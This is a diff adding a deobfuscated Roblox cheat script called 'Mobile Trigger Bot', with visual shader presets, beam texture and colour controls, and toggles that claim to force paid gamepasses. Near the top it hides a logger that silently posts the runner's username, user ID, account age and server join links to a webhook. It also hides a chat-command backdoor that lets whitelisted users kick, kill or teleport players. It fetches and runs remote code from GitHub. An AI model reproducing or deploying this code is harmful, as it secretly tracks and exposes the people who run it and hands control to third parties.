@@ -1,0 +1,1451 @@
+-- This File Was Deobfuscated In Null
+-- discord.gg/M9Tm9RT7ta
+
+local lighting = game:GetService("Lighting")
+local players = game:GetService("Players")
+local runService = game:GetService("RunService")
+local userInputService = game:GetService("UserInputService")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local replicatedFirst = game:GetService("ReplicatedFirst")
+local workspaceService = game:GetService("Workspace")
+local contextActionService = game:GetService("ContextActionService")
+local httpService = game:GetService("HttpService")
+local textChatService = game:GetService("TextChatService")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GoofedLord/Ui/refs/heads/main/Repobackup"))()
+local localPlayer = players.LocalPlayer
+local currentCamera = workspaceService.CurrentCamera
+
+task.spawn(function()
+  local v1, v2 = pcall(function() return game.JobId end)
+  local placeId = game.PlaceId
+  local v3 = v2 or "Unknown"
+  local v4 = "roblox://placeId=" .. tostring(placeId) .. "&gameInstanceId=" .. tostring(v3)
+
+  local v5 = "https://www.roblox.com/games/start?placeId=" .. tostring(placeId)
+    .. "&launchData=%7B%22gameInstanceId%22%3A%22" .. tostring(v3) .. "%22%7D"
+
+  local v6 = #players:GetPlayers()
+  local maxPlayers = players.MaxPlayers or "?"
+  local yMDTHMSZ = os.date("!%Y-%m-%dT%H:%M:%SZ")
+  local v7 = tostring(localPlayer.UserId)
+  local v8 = tostring(localPlayer.AccountAge)
+  local v9 = tostring(placeId)
+  local v10 = tostring(v3)
+  local v11 = tostring(v6)
+  local v12 = tostring(maxPlayers)
+
+  local jsonEncode = httpService:JSONEncode({
+    username = "Script Logger",
+    avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId="
+      .. tostring(localPlayer.UserId) .. "&width=420&height=420&format=png",
+    embeds = {
+      {
+        title = "🎮 Script Executed",
+        description = "Someone loaded your script!",
+        color = 16727100,
+        timestamp = yMDTHMSZ,
+        fields = {
+          {
+            name = "👤 Player Info",
+            value = "**Username:** " .. localPlayer.Name .. "\n**Display Name:** "
+              .. localPlayer.DisplayName .. "\n**User ID:** " .. v7 .. "\n**Account Age:** "
+              .. v8 .. " days",
+            inline = false,
+          },
+          {
+            name = "🖥️ Server Info",
+            value = "**Place ID:** " .. v9 .. "\n**Job ID:** `" .. v10 .. [[
+`
+**Players:** ]] .. v11 .. "/" .. v12 .. "\n**Ping:** N/A",
+            inline = false,
+          },
+          {
+            name = "🔗 Join Links",
+            value = "[Roblox Protocol](" .. v4 .. ") | [Web Browser](" .. v5 .. ")",
+            inline = false,
+          },
+        },
+        footer = { text = "Obsidian Script Logger" },
+      },
+    },
+  })
+
+  pcall(function()
+    httpService:PostAsync(WEBHOOK_URL, jsonEncode, Enum.HttpContentType.ApplicationJson)
+  end)
+end)
+
+local v13 = {}
+local v14 = false
+
+task.spawn(function()
+  local v15, v16 = pcall(function()
+    return game:HttpGet("https://raw.githubusercontent.com/Bruhiscrazy/Obsidian-/refs/heads/main/Whitelist")
+  end)
+
+  if v15 and v16 then
+    local v17, v18 = pcall(function() return httpService:JSONDecode(v16) end)
+
+    if v17 and typeof(v18) == "table" then
+      v13 = v18
+      v14 = true
+    end
+  end
+end)
+
+local function f1(p1)
+  if not v14 then
+    return false
+  end
+
+  return table.find(v13, p1.UserId) ~= nil
+end
+
+local function f2(p2)
+  if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+    local textChannels = textChatService:FindFirstChild("TextChannels")
+
+    if textChannels then
+      local rbxGeneral = textChannels:FindFirstChild("RBXGeneral")
+
+      if rbxGeneral then
+        rbxGeneral:SendAsync(p2)
+      end
+    end
+  else
+    local defaultChatSystemChatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+
+    if defaultChatSystemChatEvents
+      and defaultChatSystemChatEvents:FindFirstChild("SayMessageRequest") then
+      defaultChatSystemChatEvents.SayMessageRequest:FireServer(p2, "All")
+    end
+  end
+end
+
+local f3
+
+local function f4(p3, p4)
+  local v19
+
+  if not f1(p3) then
+    return
+  elseif p4:sub(1, 1) ~= ":" then
+    return
+  else
+    local v20 = {}
+
+    for match in p4:sub(2):gmatch("%S+") do
+      table.insert(v20, match)
+    end
+
+    local lower = v20[1] and v20[1]:lower() or ""
+    table.remove(v20, 1)
+    local v21 = table.concat(v20, " ")
+
+    if lower == "r" then
+      f2("Trigger")
+    elseif lower == "b" and v21 ~= "" then
+      local v22 = f3(v21)
+
+      if v22 and v22 ~= p3 then
+        if v22.Character and v22.Character:FindFirstChild("HumanoidRootPart") and p3.Character
+          and p3.Character:FindFirstChild("HumanoidRootPart") then
+          v22.Character.HumanoidRootPart.CFrame = p3.Character.HumanoidRootPart.CFrame
+            + Vector3.new(3, 0, 3)
+        end
+      end
+    elseif lower == "re" and v21 ~= "" then
+      local v23 = f3(v21)
+
+      if v23 and v23 ~= p3 then
+        if v23.Character and v23.Character:FindFirstChildOfClass("Humanoid") then
+          v23.Character.Humanoid.Health = 0
+        end
+      end
+    elseif lower == "k" and v21 ~= "" then
+      v19 = f3(v21)
+
+      if v19 and v19 ~= p3 then
+        pcall(function() v19:Kick("Kicked by admin") end)
+      end
+    end
+
+    return
+  end
+end
+
+function f3(p5)
+  local lower2 = p5:lower()
+
+  for index, value in ipairs(players:GetPlayers()) do
+    if value.Name:lower():find(lower2) or value.DisplayName:lower():find(lower2) then
+      return value
+    end
+  end
+
+  return nil
+end
+
+if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+  local textChannels2 = textChatService:FindFirstChild("TextChannels")
+
+  if textChannels2 then
+    local rbxGeneral2 = textChannels2:FindFirstChild("RBXGeneral")
+
+    if rbxGeneral2 then
+      rbxGeneral2.MessageReceived:Connect(function(p6)
+        local textSource = p6.TextSource
+
+        if textSource then
+          local getPlayerByUserId = players:GetPlayerByUserId(textSource.UserId)
+
+          if getPlayerByUserId then
+            f4(getPlayerByUserId, p6.Text)
+          end
+        end
+      end)
+    end
+  end
+else
+  for index2, value2 in ipairs(players:GetPlayers()) do
+    local v24 = value2
+    v24.Chatted:Connect(function(message) f4(v24, message) end)
+  end
+
+  players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message2) f4(player, message2) end)
+  end)
+end
+
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/deividcomsono/Obsidian/main/Library.lua"))()
+library.Scheme.BackgroundColor = Color3.fromRGB(45, 10, 10)
+library.Scheme.MainColor = Color3.fromRGB(65, 15, 15)
+library.Scheme.AccentColor = Color3.fromRGB(255, 60, 60)
+library.Scheme.OutlineColor = Color3.fromRGB(120, 40, 40)
+library.Scheme.FontColor = Color3.fromRGB(255, 220, 220)
+library.Scheme.RedColor = Color3.fromRGB(255, 80, 80)
+library.Scheme.DestructiveColor = Color3.fromRGB(180, 30, 30)
+library.Scheme.DarkColor = Color3.fromRGB(20, 5, 5)
+library.Scheme.WhiteColor = Color3.fromRGB(255, 240, 240)
+library:UpdateColorsUsingRegistry()
+
+local window = library:CreateWindow({
+  Title = "Mobile Trigger Bot",
+  Footer = "made by someone",
+  ToggleKeybind = Enum.KeyCode.RightShift,
+  Size = UDim2.fromOffset(450, 380),
+  Acrylic = false,
+  NotifySide = "Right",
+  ShowCustomCursor = true,
+})
+
+local addTab = window:AddTab("Trigger", "rbxassetid://10709751830")
+local addTab2 = window:AddTab("Misc", "rbxassetid://10709751830")
+local addTab3 = window:AddTab("Discord", "rbxassetid://10747383819")
+
+local community = addTab3:AddLeftGroupbox("Community")
+community:AddLabel("Join the Discord to meet other players")
+community:AddLabel("or friends to play with in FTAP")
+community:AddLabel("and get ranked!")
+
+local inviteLink = addTab3:AddRightGroupbox("Invite Link")
+
+inviteLink:AddButton("Join Discord", function()
+  local v25 = false
+
+  pcall(function()
+    if setclipboard then
+      setclipboard("https://discord.gg/YFtzwDhxhQ")
+      v25 = true
+    end
+  end)
+
+  if not v25 then
+    pcall(function()
+      if syn and syn.write_clipboard then
+        syn.write_clipboard("https://discord.gg/YFtzwDhxhQ")
+        v25 = true
+      end
+    end)
+  end
+
+  if not v25 then
+    pcall(function()
+      if clipboard and clipboard.set then
+        clipboard.set("https://discord.gg/YFtzwDhxhQ")
+        v25 = true
+      end
+    end)
+  end
+
+  if v25 then
+    library:Notify("Discord invite link copied to clipboard!", 3)
+  else
+    library:Notify("Could not copy automatically. Link: https://discord.gg/YFtzwDhxhQ", 5)
+  end
+end)
+
+inviteLink:AddLabel("Click the button above to copy")
+inviteLink:AddLabel("the Discord invite link.")
+
+local v26 = {
+  Ambient = lighting.Ambient,
+  OutdoorAmbient = lighting.OutdoorAmbient,
+  GlobalShadows = lighting.GlobalShadows,
+  Brightness = lighting.Brightness,
+}
+
+local function f5()
+  for index3, value3 in ipairs(lighting:GetChildren()) do
+    if value3:IsA("PostEffect") or value3:IsA("Sky") or value3:IsA("Atmosphere") then
+      value3:Destroy()
+    end
+  end
+
+  lighting.Brightness = v26.Brightness
+  lighting.ExposureCompensation = 0
+  lighting.ClockTime = 14
+  lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
+  lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
+  lighting.OutdoorAmbient = v26.OutdoorAmbient
+  lighting.FogColor = Color3.fromRGB(192, 192, 192)
+  lighting.FogEnd = 100000
+  lighting.FogStart = 0
+  lighting.ShadowSoftness = 0
+  lighting.Ambient = v26.Ambient
+  lighting.GlobalShadows = v26.GlobalShadows
+end
+
+local v27 = { active = false, selected = "Classic" }
+
+local function f6(p7)
+  for index4, value4 in ipairs(lighting:GetChildren()) do
+    if value4:IsA("PostEffect") or value4:IsA("Sky") or value4:IsA("Atmosphere") then
+      value4:Destroy()
+    end
+  end
+
+  lighting.Brightness = 2
+  lighting.ExposureCompensation = 0
+  lighting.ClockTime = 14
+  lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
+  lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
+  lighting.OutdoorAmbient = Color3.fromRGB(200, 200, 200)
+  lighting.FogColor = Color3.fromRGB(192, 192, 192)
+  lighting.FogEnd = 100000
+  lighting.FogStart = 0
+  lighting.ShadowSoftness = 0
+  lighting.Ambient = Color3.fromRGB(120, 120, 120)
+
+  if p7 == "Classic" then
+    local instance = Instance.new("Sky", lighting)
+    instance.StarCount = 5000
+    instance.SunAngularSize = 5
+
+    local instance2 = Instance.new("BloomEffect", lighting)
+    instance2.Intensity = 0.3
+    instance2.Size = 10
+    instance2.Threshold = 0.8
+
+    Instance.new("BlurEffect", lighting).Size = 5
+
+    local instance3 = Instance.new("ColorCorrectionEffect", lighting)
+    instance3.Brightness = 0
+    instance3.Contrast = 0.1
+    instance3.Saturation = 0.25
+    instance3.TintColor = Color3.fromRGB(255, 255, 255)
+
+    local instance4 = Instance.new("SunRaysEffect", lighting)
+    instance4.Intensity = 0.1
+    instance4.Spread = 0.8
+
+    lighting.Brightness = 2.25
+    lighting.ExposureCompensation = 0.1
+    lighting.ClockTime = 17.55
+  elseif p7 == "Twilight" then
+    local instance5 = Instance.new("BloomEffect", lighting)
+    instance5.Intensity = 0.1
+    instance5.Threshold = 0
+    instance5.Size = 100
+
+    local instance6 = Instance.new("Sky", lighting)
+    instance6.SkyboxUp = "rbxassetid://323493360"
+    instance6.SkyboxLf = "rbxassetid://323494252"
+    instance6.SkyboxBk = "rbxassetid://323494035"
+    instance6.SkyboxFt = "rbxassetid://323494130"
+    instance6.SkyboxDn = "rbxassetid://323494368"
+    instance6.SkyboxRt = "rbxassetid://323494067"
+    instance6.SunAngularSize = 14
+
+    local instance7 = Instance.new("ColorCorrectionEffect", lighting)
+    instance7.Saturation = 0.05
+    instance7.TintColor = Color3.fromRGB(255, 224, 219)
+
+    Instance.new("SunRaysEffect", lighting).Intensity = 0.05
+
+    lighting.Brightness = 3.5
+    lighting.ColorShift_Bottom = Color3.fromRGB(11, 0, 20)
+    lighting.ColorShift_Top = Color3.fromRGB(240, 127, 14)
+    lighting.OutdoorAmbient = Color3.fromRGB(34, 0, 49)
+    lighting.ClockTime = 6.7
+    lighting.FogColor = Color3.fromRGB(94, 76, 106)
+    lighting.FogEnd = 1000
+    lighting.ExposureCompensation = 0.24
+    lighting.Ambient = Color3.fromRGB(59, 33, 27)
+  elseif p7 == "Luminous" then
+    local instance8 = Instance.new("BloomEffect", lighting)
+    instance8.Intensity = 0.1
+    instance8.Threshold = 0
+    instance8.Size = 100
+
+    local instance9 = Instance.new("Sky", lighting)
+    instance9.SkyboxUp = "rbxassetid://323493360"
+    instance9.SkyboxLf = "rbxassetid://323494252"
+    instance9.SkyboxBk = "rbxassetid://323494035"
+    instance9.SkyboxFt = "rbxassetid://323494130"
+    instance9.SkyboxDn = "rbxassetid://323494368"
+    instance9.SkyboxRt = "rbxassetid://323494067"
+    instance9.SunAngularSize = 14
+
+    lighting.Brightness = 2
+    lighting.ColorShift_Bottom = Color3.fromRGB(250, 250, 250)
+    lighting.ColorShift_Top = Color3.fromRGB(250, 250, 250)
+    lighting.OutdoorAmbient = Color3.fromRGB(150, 150, 150)
+    lighting.ClockTime = 10
+    lighting.FogColor = Color3.fromRGB(20, 20, 20)
+    lighting.FogEnd = 10000
+    lighting.ExposureCompensation = 0.5
+    lighting.Ambient = Color3.fromRGB(50, 50, 50)
+  elseif p7 == "Sandstorm" then
+    local instance10 = Instance.new("BloomEffect", lighting)
+    instance10.Intensity = 0.1
+    instance10.Threshold = 0
+    instance10.Size = 100
+
+    local instance11 = Instance.new("Sky", lighting)
+    instance11.SkyboxUp = "rbxassetid://323493360"
+    instance11.SkyboxLf = "rbxassetid://323494252"
+    instance11.SkyboxBk = "rbxassetid://323494035"
+    instance11.SkyboxFt = "rbxassetid://323494130"
+    instance11.SkyboxDn = "rbxassetid://323494368"
+    instance11.SkyboxRt = "rbxassetid://323494067"
+    instance11.SunAngularSize = 14
+
+    lighting.Brightness = 2.5
+    lighting.ColorShift_Bottom = Color3.fromRGB(240, 120, 20)
+    lighting.ColorShift_Top = Color3.fromRGB(240, 127, 14)
+    lighting.OutdoorAmbient = Color3.fromRGB(100, 50, 10)
+    lighting.ClockTime = 7
+    lighting.FogColor = Color3.fromRGB(100, 55, 20)
+    lighting.FogEnd = 1000
+    lighting.ExposureCompensation = 0.5
+    lighting.Ambient = Color3.fromRGB(80, 40, 10)
+  elseif p7 == "Arctic" then
+    local instance12 = Instance.new("ColorCorrectionEffect", lighting)
+    instance12.Saturation = -0.3
+    instance12.Contrast = 0.2
+    instance12.TintColor = Color3.fromRGB(220, 240, 255)
+
+    local instance13 = Instance.new("BloomEffect", lighting)
+    instance13.Intensity = 0.8
+    instance13.Size = 24
+    instance13.Threshold = 0.6
+
+    local instance14 = Instance.new("Atmosphere", lighting)
+    instance14.Density = 0.45
+    instance14.Color = Color3.fromRGB(180, 200, 255)
+    instance14.Decay = Color3.fromRGB(255, 255, 255)
+    instance14.Glare = 0.6
+
+    lighting.Ambient = Color3.fromRGB(0, 50, 100)
+    lighting.OutdoorAmbient = Color3.fromRGB(150, 170, 200)
+    lighting.GlobalShadows = true
+  end
+end
+
+local visualShaders = addTab2:AddLeftGroupbox("Visual Shaders")
+
+visualShaders:AddToggle("ShaderMasterToggle", {
+  Text = "Enable Shader",
+  Default = false,
+  Tooltip = "Applies the selected preset. Turn off to reset lighting.",
+  Callback = function(value5)
+    v27.active = value5
+
+    if value5 then
+      f6(v27.selected)
+      library:Notify("Shader applied: " .. v27.selected, 3)
+    else
+      f5()
+      library:Notify("Shaders reset.", 3)
+    end
+  end,
+})
+
+visualShaders:AddDropdown("ShaderPresetDrop", {
+  Values = { "Classic", "Twilight", "Luminous", "Sandstorm", "Arctic" },
+  Default = "Classic",
+  Multi = false,
+  Text = "Preset",
+  Callback = function(value6)
+    v27.selected = value6
+
+    if v27.active then
+      f6(value6)
+    end
+  end,
+})
+
+local gamepass = addTab2:AddLeftGroupbox("Gamepass")
+local v28 = false
+local v29 = false
+
+local function f7()
+  if v29 then
+    return
+  end
+
+  v29 = true
+
+  task.spawn(function()
+    while v28 do
+      task.wait(0.3)
+    end
+
+    v29 = false
+  end)
+end
+
+gamepass:AddToggle("ReachToggle", {
+  Text = "Farther Reach",
+  Default = false,
+  Tooltip = "Forces the Farther Reach gamepass to apply. Auto-reapplies on respawn.",
+  Callback = function(value7)
+    v28 = value7
+
+    if value7 then
+      f7()
+    end
+  end,
+})
+
+players.LocalPlayer.CharacterAdded:Connect(function()
+  if not v28 then
+    return
+  end
+
+  task.spawn(function()
+    local total = 0
+
+    while total < 5 do
+      if not v28 then
+        return
+      end
+
+      task.wait(0.2)
+      total = total + 0.2
+    end
+  end)
+end)
+
+local v30 = false
+local v31 = false
+
+local function f8()
+  if v31 then
+    return
+  end
+
+  v31 = true
+
+  task.spawn(function()
+    while v30 do
+      task.wait(0.5)
+    end
+
+    v31 = false
+  end)
+end
+
+gamepass:AddToggle("ColorsToggle", {
+  Text = "Colors",
+  Default = false,
+  Tooltip = "Enables the Multicolor Line gamepass.",
+  Callback = function(value8)
+    v30 = value8
+
+    if value8 then
+      f8()
+    end
+  end,
+})
+
+players.LocalPlayer.CharacterAdded:Connect(function()
+  if not v30 then
+    return
+  end
+
+  task.spawn(function()
+    local total2 = 0
+
+    while total2 < 5 do
+      if not v30 then
+        return
+      end
+
+      task.wait(0.3)
+      total2 = total2 + 0.3
+    end
+  end)
+end)
+
+local beamControls = addTab2:AddRightGroupbox("Beam Controls")
+
+local v32 = {
+  Red = Color3.fromRGB(255, 0, 0),
+  Orange = Color3.fromRGB(255, 140, 0),
+  Yellow = Color3.fromRGB(255, 255, 0),
+  Green = Color3.fromRGB(0, 255, 0),
+  Cyan = Color3.fromRGB(0, 255, 255),
+  Blue = Color3.fromRGB(0, 100, 255),
+  Purple = Color3.fromRGB(150, 0, 255),
+  Pink = Color3.fromRGB(255, 105, 180),
+  White = Color3.fromRGB(255, 255, 255),
+  Black = Color3.fromRGB(30, 30, 30),
+}
+
+local values = {
+  "Red", "Orange", "Yellow", "Green", "Cyan", "Blue", "Purple", "Pink", "White", "Black",
+}
+
+local v33 = {
+  ["Low Quality"] = "",
+  ["Non-Gamepass"] = "rbxassetid://8933346550",
+  Gamepass = "rbxassetid://8933355899",
+  Chain = "rbxassetid://81358145120405",
+  ["Chain 2"] = "rbxassetid://132910145874066",
+  ["Chain 3"] = "rbxassetid://128466395060514",
+  ["Chain 4"] = "rbxassetid://73368670987191",
+  Rope = "rbxassetid://78999022056924",
+  Spring = "rbxassetid://18837732116",
+  Circle = "rbxassetid://5367817750",
+  ["Circle-Outline"] = "rbxassetid://12201347372",
+  Triangle = "rbxassetid://4704920160",
+  ["Triangle-Outline"] = "rbxassetid://94666748694025",
+  Square = "rbxassetid://15007588972",
+  ["Square-Outline"] = "rbxassetid://15420927706",
+  Heart = "rbxassetid://89015294175898",
+  ["Heart-Outline"] = "rbxassetid://125373934805238",
+  Moon = "rbxassetid://9013498676",
+  Dots = "rbxassetid://9169659357",
+  Bubble = "rbxassetid://1249690853",
+  Star = "rbxassetid://5639840603",
+  Robux = "rbxassetid://11560341132",
+  ["Roblox-Logo"] = "rbxassetid://12348119032",
+  Brick = "rbxassetid://4430903072",
+  Studs = "rbxassetid://15539356451",
+  Fire = "rbxassetid://18654087326",
+  Lazar = "rbxassetid://8922958725",
+  ["Spider-Web"] = "rbxassetid://123815660139244",
+  Smoke = "rbxassetid://12900071392",
+  ["Audio-Visualiser"] = "rbxassetid://81588563590679",
+  Pulse = "rbxassetid://82163767314193",
+  Arrow = "rbxassetid://9006027964",
+  ["Arrow 2"] = "rbxassetid://10249261576",
+}
+
+local color = Color3.fromRGB(255, 255, 255)
+local v34 = "rbxassetid://8933355899"
+local v35 = "Gamepass"
+
+local function f9(p8, p9, p10)
+  return Color3.new(
+    p8.R + (p9.R - p8.R) * p10, p8.G + (p9.G - p8.G) * p10, p8.B + (p9.B - p8.B) * p10
+  )
+end
+
+local v36 = { v32.Red, v32.Black, v32.White }
+
+local function f10(p11)
+  local parent = p11.Parent
+
+  return parent
+    and (parent.Name == "GrabParts" or parent.Name == "BeamPart" or parent.Name == "DragPart")
+end
+
+local v37 = 1
+
+local function f11(p12)
+  pcall(function()
+    if p12 and p12:IsA("BasePart") then
+      p12.Color = color
+    end
+  end)
+end
+
+local v38 = true
+local v39 = {}
+
+local function f12(p13)
+  for key, value9 in pairs(v39) do
+    if value9 ~= p13 and value9.Value then
+      value9:SetValue(false)
+    end
+  end
+end
+
+local textureSpeed = 5
+
+local function f13(p14)
+  local character = localPlayer.Character
+
+  if not character then
+    return false
+  else
+    local attachment0 = p14.Attachment0
+    local attachment1 = p14.Attachment1
+
+    if attachment0 and attachment0.Parent then
+      if attachment0.Parent:FindFirstAncestorOfClass("Model") == character then
+        return true
+      end
+    end
+
+    if attachment1 and attachment1.Parent then
+      if attachment1.Parent:FindFirstAncestorOfClass("Model") == character then
+        return true
+      end
+
+      return false
+    end
+
+    return false
+  end
+end
+
+local function f14(p15)
+  pcall(function()
+    if not p15 or not p15:IsA("Beam") then
+      return
+    end
+    p15.Color = ColorSequence.new(color)
+
+    if v38 and v34 ~= "" then
+      p15.Texture = v34
+      p15.TextureMode = Enum.TextureMode.Stretch
+      p15.TextureLength = 5
+      p15.TextureSpeed = textureSpeed
+    else
+      p15.Texture = ""
+    end
+  end)
+end
+
+local v40 = {}
+local v41 = {}
+local v42 = {}
+
+local function f15(p16)
+  if not p16 or not p16:IsA("Beam") then
+    return
+  elseif v40[p16] then
+    return
+  else
+    if not f13(p16) then
+      return
+    end
+
+    v40[p16] = true
+
+    v42[p16] = p16.AncestryChanged:Connect(function()
+      if not p16:IsDescendantOf(workspaceService)
+        and not p16:IsDescendantOf(localPlayer.Character) then
+        v40[p16] = nil
+
+        if v42[p16] then
+          v42[p16]:Disconnect()
+          v42[p16] = nil
+        end
+      end
+    end)
+
+    return
+  end
+end
+
+local function f16(p17)
+  if not p17 or not p17:IsA("BasePart") then
+    return
+  elseif v41[p17] then
+    return
+  else
+    if not f10(p17) then
+      return
+    end
+
+    v41[p17] = true
+
+    v42[p17] = p17.AncestryChanged:Connect(function()
+      if not p17:IsDescendantOf(workspaceService)
+        and not p17:IsDescendantOf(localPlayer.Character) then
+        v41[p17] = nil
+
+        if v42[p17] then
+          v42[p17]:Disconnect()
+          v42[p17] = nil
+        end
+      end
+    end)
+
+    return
+  end
+end
+
+local function f17()
+  local character2 = localPlayer.Character
+
+  if not character2 then
+    return
+  end
+
+  for key2, value10 in pairs(workspaceService:GetDescendants()) do
+    if value10:IsA("Beam") then
+      f15(value10)
+    end
+  end
+
+  for key3, value11 in pairs(character2:GetDescendants()) do
+    if value11:IsA("Beam") then
+      f15(value11)
+    elseif value11:IsA("BasePart") then
+      f16(value11)
+    end
+  end
+end
+
+local connect, connect2
+
+local function f18()
+  if connect then
+    connect:Disconnect()
+  end
+
+  if connect2 then
+    connect2:Disconnect()
+  end
+
+  connect = nil
+  connect2 = nil
+end
+
+local connect3
+
+local function f19()
+  if connect3 then
+    connect3:Disconnect()
+  end
+
+  connect3 = runService.Heartbeat:Connect(function() end)
+end
+
+beamControls:AddLabel("▼ Color Modes")
+
+v39.Rainbow = beamControls:AddToggle("Rainbow", {
+  Text = "Rainbow Mode",
+  Default = false,
+  Tooltip = "Full spectrum rainbow animation",
+  Callback = function(value12)
+    if value12 then
+      f12(v39.Rainbow)
+      f18()
+      library:Notify("Rainbow Mode ON", 2)
+
+      connect = runService.Heartbeat:Connect(function()
+        local v43 = tick()
+        color = Color3.fromHSV(v43 * 0.6 % 1, 1, 1)
+      end)
+    else
+      f18()
+    end
+  end,
+})
+
+beamControls:AddDivider()
+beamControls:AddLabel("▼ Texture Line")
+
+beamControls:AddDropdown("TextureSelect", {
+  Values = {
+    "Low Quality", "Non-Gamepass", "Gamepass", "Chain", "Chain 2", "Chain 3", "Chain 4", "Rope",
+    "Spring", "Circle", "Circle-Outline", "Triangle", "Triangle-Outline", "Square",
+    "Square-Outline", "Heart", "Heart-Outline", "Moon", "Dots", "Bubble", "Star", "Robux",
+    "Roblox-Logo", "Brick", "Studs", "Fire", "Lazar", "Spider-Web", "Smoke", "Audio-Visualiser",
+    "Pulse", "Arrow", "Arrow 2",
+  },
+  Default = "Gamepass",
+  Multi = false,
+  Text = "Select Texture",
+  Tooltip = "Choose which texture to apply",
+  Callback = function(value13)
+    v35 = value13
+
+    if v38 then
+      local v44 = v33[value13]
+
+      if v44 == "" then
+        v34 = ""
+        v38 = false
+        library:Notify("Texture: Low Quality (Default)", 2)
+      else
+        v34 = v44
+        library:Notify("Switched to: " .. value13, 2)
+      end
+    end
+  end,
+})
+
+beamControls:AddToggle("TextureLine", {
+  Text = "Enable Texture Line",
+  Default = true,
+  Tooltip = "Turn on the selected texture",
+  Callback = function(value14)
+    if value14 then
+      v38 = true
+      v34 = "rbxassetid://8933355899"
+      library:Notify("Texture ON: " .. v35, 2)
+    else
+      v38 = false
+      v34 = ""
+      library:Notify("Texture OFF", 2)
+    end
+  end,
+})
+
+beamControls:AddSlider("TextureSpeed", {
+  Text = "Scroll Speed",
+  Default = 5,
+  Min = 0,
+  Max = 20,
+  Rounding = 1,
+  Compact = true,
+  Tooltip = "How fast texture moves along beam",
+  Callback = function(value15) textureSpeed = value15 end,
+})
+
+beamControls:AddDivider()
+beamControls:AddLabel("▼ 3-Color Animation")
+
+beamControls:AddDropdown("Color1", {
+  Values = values,
+  Default = "Red",
+  Multi = false,
+  Text = "Color 1",
+  Callback = function(value16) v36[1] = v32[value16] end,
+})
+
+beamControls:AddDropdown("Color2", {
+  Values = values,
+  Default = "Black",
+  Multi = false,
+  Text = "Color 2",
+  Callback = function(value17) v36[2] = v32[value17] end,
+})
+
+beamControls:AddDropdown("Color3", {
+  Values = values,
+  Default = "White",
+  Multi = false,
+  Text = "Color 3",
+  Callback = function(value18) v36[3] = v32[value18] end,
+})
+
+beamControls:AddSlider("AnimSpeed", {
+  Text = "Anim Speed",
+  Default = 1,
+  Min = 0.1,
+  Max = 5,
+  Rounding = 1,
+  Compact = true,
+  Tooltip = "Speed of color cycle",
+  Callback = function(value19) v37 = value19 end,
+})
+
+v39.CustomAnim = beamControls:AddToggle("CustomAnim", {
+  Text = "Enable 3-Color Animation",
+  Default = false,
+  Tooltip = "Animate between 3 chosen colors",
+  Callback = function(value20)
+    if value20 then
+      f12(v39.CustomAnim)
+      f18()
+      library:Notify("3-Color Animation ON", 2)
+
+      connect2 = runService.Heartbeat:Connect(function()
+        local v45 = tick() * v37 % 3
+        local v46
+
+        if v45 < 1 then
+          v46 = f9(v36[1], v36[2], v45)
+        elseif v45 < 2 then
+          v46 = f9(v36[2], v36[3], v45 - 1)
+        else
+          v46 = f9(v36[3], v36[1], v45 - 2)
+        end
+
+        color = v46
+      end)
+    else
+      f18()
+    end
+  end,
+})
+
+beamControls:AddDivider()
+beamControls:AddLabel("▼ Custom Texture ID")
+
+local v47 = ""
+
+beamControls:AddInput("TextureID", {
+  Default = "",
+  Numeric = false,
+  Finished = true,
+  Text = "Texture ID",
+  Tooltip = "Enter rbxassetid:// number or just numbers",
+  Placeholder = "e.g. 446111271",
+  Callback = function(value21) v47 = value21 end,
+})
+
+beamControls:AddButton({
+  Text = "Apply Texture",
+  Func = function()
+    local v48 = v47
+
+    if v48 == "" then
+      library:Notify("Enter a texture ID!", 3)
+      return
+    else
+      local v49 = v48
+
+      if not v48:match("rbxassetid://") then
+        if v48:match("^%d+$") then
+          v49 = "rbxassetid://" .. v48
+          v38 = true
+          v34 = v49
+          library:Notify("Custom Texture Applied", 3)
+          return
+        end
+
+        library:Notify("Invalid ID! Use numbers only.", 3)
+        return
+      end
+
+      v38 = true
+      v34 = v49
+      library:Notify("Custom Texture Applied", 3)
+      return
+    end
+  end,
+  DoubleClick = false,
+  Tooltip = "Apply texture to your beams",
+})
+
+beamControls:AddButton({
+  Text = "Remove Texture",
+  Func = function()
+    v38 = false
+    v34 = ""
+    library:Notify("Texture removed", 2)
+  end,
+  DoubleClick = false,
+  Tooltip = "Reset to default beam texture",
+})
+
+local function f20(p18)
+  p18.DescendantAdded:Connect(function(descendant)
+    if descendant:IsA("Beam") then
+      f15(descendant)
+      f14(descendant)
+    elseif descendant:IsA("BasePart") then
+      f16(descendant)
+      f11(descendant)
+    end
+  end)
+
+  p18.ChildAdded:Connect(function(child)
+    if child.Name == "GrabParts" or child.Name == "BeamPart" or child.Name == "DragPart" then
+      for key4, value22 in pairs(child:GetDescendants()) do
+        if value22:IsA("Beam") then
+          f15(value22)
+          f14(value22)
+        elseif value22:IsA("BasePart") then
+          f16(value22)
+          f11(value22)
+        end
+      end
+
+      child.DescendantAdded:Connect(function(descendant2)
+        if descendant2:IsA("Beam") then
+          f15(descendant2)
+          f14(descendant2)
+        elseif descendant2:IsA("BasePart") then
+          f16(descendant2)
+          f11(descendant2)
+        end
+      end)
+    end
+  end)
+end
+
+workspaceService.DescendantAdded:Connect(function(descendant3)
+  if descendant3:IsA("Beam") then
+    f15(descendant3)
+    f14(descendant3)
+  elseif descendant3:IsA("Model") then
+    for key5, value23 in pairs(descendant3:GetDescendants()) do
+      if value23:IsA("Beam") then
+        f15(value23)
+        f14(value23)
+      end
+    end
+
+    descendant3.DescendantAdded:Connect(function(descendant4)
+      if descendant4:IsA("Beam") then
+        f15(descendant4)
+        f14(descendant4)
+      end
+    end)
+  end
+end)
+
+if localPlayer.Character then
+  f20(localPlayer.Character)
+  f17()
+end
+
+localPlayer.CharacterAdded:Connect(function(character3)
+  for key6, value24 in pairs(v42) do
+    local v50 = value24
+    pcall(function() v50:Disconnect() end)
+  end
+
+  v40 = {}
+  v41 = {}
+  v42 = {}
+  task.wait(0.1)
+  f20(character3)
+  f17()
+end)
+
+f19()
+
